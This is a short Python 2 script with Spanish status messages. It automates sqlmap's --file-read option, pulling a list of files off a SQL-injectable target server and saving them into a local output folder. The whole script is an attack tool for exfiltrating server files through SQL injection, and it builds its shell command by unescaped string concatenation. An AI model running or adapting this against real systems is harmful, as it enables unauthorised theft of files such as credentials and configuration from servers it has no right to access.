#! /usr/bin/python

import commands
import os
import re
import shutil
import sys



sqlmap_arg = sys.argv[1]
dirw = sys.argv[2]
files = sys.argv[3].split()

def download_file(f):	
	status, ret = commands.getstatusoutput("sqlmap " + sqlmap_arg + " --file-read=" + f + " --batch")
	patron = re.compile("files saved to.*\n\[\*\] (.*) \(size.*")
	filed = patron.findall(ret)
	if len(filed) > 0:
		print(filed[0])
		shutil.move(filed[0],"output/" + f)

		
if os.path.isdir("output"):
	print ("directorio output creado")
else:
	os.makedirs("output")
	print ("directorio output creado")

os.chdir("output")



while (files):
	download_file(files.pop())

print "descarga finalizada en " + dirw

